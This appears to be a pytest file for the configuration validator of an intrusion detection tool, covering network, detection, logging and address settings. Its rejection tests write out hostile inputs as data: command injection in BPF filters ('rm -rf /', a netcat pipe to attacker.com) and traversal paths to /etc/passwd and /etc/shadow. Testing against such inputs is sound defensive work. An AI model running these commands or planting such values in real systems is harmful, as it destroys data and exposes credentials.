"""
Tests for configuration validation and security checks.
"""

import pytest
from unittest.mock import patch

from skada_ids.config_validator import ConfigurationValidator


class TestConfigurationValidator:
    """Test ConfigurationValidator class."""
    
    def test_initialization(self):
        """Test validator initialization."""
        validator = ConfigurationValidator()
        assert len(validator.errors) == 0
        assert len(validator.warnings) == 0
    
    def test_valid_configuration(self):
        """Test validation of valid configuration."""
        config = {
            'app_name': 'SKADA-IDS-KC',
            'version': '1.0.0',
            'debug_mode': False,
            'network': {
                'interface': 'eth0',
                'bpf_filter': 'tcp and tcp[13]=2',
                'promiscuous_mode': True,
                'capture_timeout': 5
            },
            'detection': {
                'prob_threshold': 0.7,
                'window_seconds': 60,
                'max_queue_size': 10000,
                'model_path': 'models/syn_model.joblib',
                'scaler_path': 'models/syn_scaler.joblib'
            },
            'notifications': {
                'enable_notifications': True,
                'notification_timeout': 5,
                'sound_enabled': True
            },
            'logging': {
                'log_level': 'INFO',
                'log_dir': 'logs',
                'log_file': 'skada.log',
                'max_log_size': 2097152,
                'backup_count': 7
            }
        }
        
        validator = ConfigurationValidator()
        is_valid, errors, warnings = validator.validate_configuration(config)
        
        assert is_valid
        assert len(errors) == 0
    
    def test_invalid_network_config(self):
        """Test validation of invalid network configuration."""
        config = {
            'network': {
                'interface': 'x' * 100,  # Too long
                'bpf_filter': 'x' * 2000,  # Too long
                'capture_timeout': 100  # Too high
            }
        }
        
        validator = ConfigurationValidator()
        is_valid, errors, warnings = validator.validate_configuration(config)
        
        assert not is_valid
        assert len(errors) >= 3
        assert any('interface name too long' in error.lower() for error in errors)
        assert any('bpf filter too long' in error.lower() for error in errors)
        assert any('capture timeout' in error.lower() for error in errors)
    
    def test_invalid_detection_config(self):
        """Test validation of invalid detection configuration."""
        config = {
            'detection': {
                'prob_threshold': 1.5,  # Too high
                'window_seconds': 5000,  # Too high
                'max_queue_size': 50,  # Too low
                'model_path': '../../../etc/passwd',  # Path traversal
                'scaler_path': 123  # Wrong type
            }
        }
        
        validator = ConfigurationValidator()
        is_valid, errors, warnings = validator.validate_configuration(config)
        
        assert not is_valid
        assert len(errors) >= 5
    
    def test_invalid_logging_config(self):
        """Test validation of invalid logging configuration."""
        config = {
            'logging': {
                'log_level': 'INVALID',
                'log_dir': '../../../etc',  # Unsafe path
                'log_file': 'log<>file.log',  # Invalid characters
                'max_log_size': 500,  # Too small
                'backup_count': 100  # Too high
            }
        }
        
        validator = ConfigurationValidator()
        is_valid, errors, warnings = validator.validate_configuration(config)
        
        assert not is_valid
        assert len(errors) >= 5
    
    def test_bpf_filter_validation(self):
        """Test BPF filter validation."""
        validator = ConfigurationValidator()
        
        # Valid filters
        assert validator._validate_bpf_filter('tcp')
        assert validator._validate_bpf_filter('tcp and tcp[13]=2')
        assert validator._validate_bpf_filter('tcp and port 80')
        
        # Invalid filters
        assert not validator._validate_bpf_filter('tcp; rm -rf /')
        assert not validator._validate_bpf_filter('tcp | nc attacker.com 1234')
        assert not validator._validate_bpf_filter('')
        assert not validator._validate_bpf_filter('exec("malicious_code")')
    
    def test_file_path_validation(self):
        """Test file path validation."""
        validator = ConfigurationValidator()
        
        # Valid paths
        assert validator._validate_file_path('models/syn_model.joblib')
        assert validator._validate_file_path('logs/app.log')
        assert validator._validate_file_path('/opt/skada/models/model.joblib')
        
        # Invalid paths
        assert not validator._validate_file_path('../../../etc/passwd')
        assert not validator._validate_file_path('../../sensitive_file')
        assert not validator._validate_file_path('/etc/shadow')
    
    def test_filename_validation(self):
        """Test filename validation."""
        validator = ConfigurationValidator()
        
        # Valid filenames
        assert validator._validate_filename('app.log')
        assert validator._validate_filename('model_v1.joblib')
        assert validator._validate_filename('config-2023.yaml')
        
        # Invalid filenames
        assert not validator._validate_filename('app/log.txt')  # Contains /
        assert not validator._validate_filename('app:log.txt')  # Contains :
        assert not validator._validate_filename('CON')  # Reserved name
        assert not validator._validate_filename('x' * 300)  # Too long
    
    def test_ip_address_validation(self):
        """Test IP address validation."""
        validator = ConfigurationValidator()
        
        # Valid IP addresses
        assert validator.validate_ip_address('192.168.1.1')
        assert validator.validate_ip_address('10.0.0.1')
        assert validator.validate_ip_address('::1')  # IPv6
        assert validator.validate_ip_address('2001:db8::1')  # IPv6
        
        # Invalid IP addresses
        assert not validator.validate_ip_address('256.1.1.1')
        assert not validator.validate_ip_address('192.168.1')
        assert not validator.validate_ip_address('not.an.ip.address')
        assert not validator.validate_ip_address('')
    
    def test_port_validation(self):
        """Test port number validation."""
        validator = ConfigurationValidator()
        
        # Valid ports
        assert validator.validate_port_number(80)
        assert validator.validate_port_number(443)
        assert validator.validate_port_number(0)
        assert validator.validate_port_number(65535)
        
        # Invalid ports
        assert not validator.validate_port_number(-1)
        assert not validator.validate_port_number(65536)
        assert not validator.validate_port_number('80')  # String
        assert not validator.validate_port_number(80.5)  # Float
    
    def test_security_recommendations(self):
        """Test security recommendations."""
        config = {
            'debug_mode': True,
            'network': {
                'bpf_filter': 'tcp'  # Overly permissive
            },
            'detection': {
                'max_queue_size': 100000  # Large queue
            },
            'logging': {
                'log_level': 'DEBUG'  # Verbose logging
            }
        }
        
        validator = ConfigurationValidator()
        recommendations = validator.get_security_recommendations(config)
        
        assert len(recommendations) >= 4
        assert any('debug mode' in rec.lower() for rec in recommendations)
        assert any('bpf filter' in rec.lower() for rec in recommendations)
        assert any('queue size' in rec.lower() for rec in recommendations)
        assert any('debug logging' in rec.lower() for rec in recommendations)
    
    def test_type_validation(self):
        """Test type validation for configuration values."""
        config = {
            'app_name': 123,  # Should be string
            'debug_mode': 'true',  # Should be boolean
            'network': {
                'interface': 123,  # Should be string
                'capture_timeout': '5'  # Should be int
            },
            'detection': {
                'prob_threshold': '0.7',  # Should be float
                'window_seconds': 60.5  # Should be int
            },
            'notifications': {
                'enable_notifications': 'yes'  # Should be boolean
            }
        }
        
        validator = ConfigurationValidator()
        is_valid, errors, warnings = validator.validate_configuration(config)
        
        assert not is_valid
        assert len(errors) >= 6
    
    def test_boundary_values(self):
        """Test boundary value validation."""
        # Test minimum values
        config_min = {
            'detection': {
                'prob_threshold': 0.0,
                'window_seconds': 1,
                'max_queue_size': 100
            },
            'notifications': {
                'notification_timeout': 1
            },
            'logging': {
                'max_log_size': 1024,
                'backup_count': 1
            }
        }
        
        validator = ConfigurationValidator()
        is_valid, errors, warnings = validator.validate_configuration(config_min)
        assert is_valid
        
        # Test maximum values
        config_max = {
            'detection': {
                'prob_threshold': 1.0,
                'window_seconds': 3600,
                'max_queue_size': 1000000
            },
            'notifications': {
                'notification_timeout': 60
            },
            'logging': {
                'max_log_size': 100*1024*1024,
                'backup_count': 50
            }
        }
        
        is_valid, errors, warnings = validator.validate_configuration(config_max)
        assert is_valid
        
        # Test out-of-bounds values
        config_invalid = {
            'detection': {
                'prob_threshold': -0.1,  # Below minimum
                'window_seconds': 5000,  # Above maximum
                'max_queue_size': 50  # Below minimum
            }
        }
        
        is_valid, errors, warnings = validator.validate_configuration(config_invalid)
        assert not is_valid
        assert len(errors) >= 3
    
    def test_nested_config_validation(self):
        """Test validation of nested configuration structures."""
        config = {
            'network': {
                'interface': 'eth0'
                # Missing other required fields - should still be valid as they have defaults
            },
            'detection': {
                'prob_threshold': 0.8
                # Partial configuration should be valid
            }
        }
        
        validator = ConfigurationValidator()
        is_valid, errors, warnings = validator.validate_configuration(config)
        
        # Should be valid as missing fields have defaults
        assert is_valid
        assert len(errors) == 0
    
    def test_empty_configuration(self):
        """Test validation of empty configuration."""
        config = {}
        
        validator = ConfigurationValidator()
        is_valid, errors, warnings = validator.validate_configuration(config)
        
        # Empty config should be valid (uses defaults)
        assert is_valid
        assert len(errors) == 0
